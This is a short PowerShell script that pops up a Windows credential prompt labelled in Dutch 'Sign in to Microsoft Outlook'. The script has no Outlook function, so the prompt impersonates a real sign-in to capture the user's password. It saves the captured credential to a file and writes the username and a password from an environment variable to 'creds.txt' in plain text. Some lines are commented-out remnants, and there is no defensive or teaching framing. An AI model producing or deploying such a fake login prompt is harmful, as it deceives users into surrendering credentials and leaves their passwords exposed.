#$Path = "creds2.txt"
#$Credential = Get-Credential
$filename = "creds"
#$Credential | Export-CliXml -Path $Path
# decryption
#$Credential = Import-CliXml -Path $Path
#$pass = $credential.GetNetworkCredential().Password
#$NewFile += $pass
$Username = $env:USERNAME
$pass = $env:PASSWORD
$Hash = @{
    'User'       = Get-Credential -Message 'Meld u aan op Microsoft Outlook'
}
$Hash | Export-Clixml -Path "Hash.Cred"
$Hash = Import-CliXml -Path "Hash.Cred"
#https://md5hashing.net/hash

$NewFile += "user $Username, pass $pass"
Out-File -InputObject $NewFile -FilePath "$($filename).txt" -Encoding ASCII

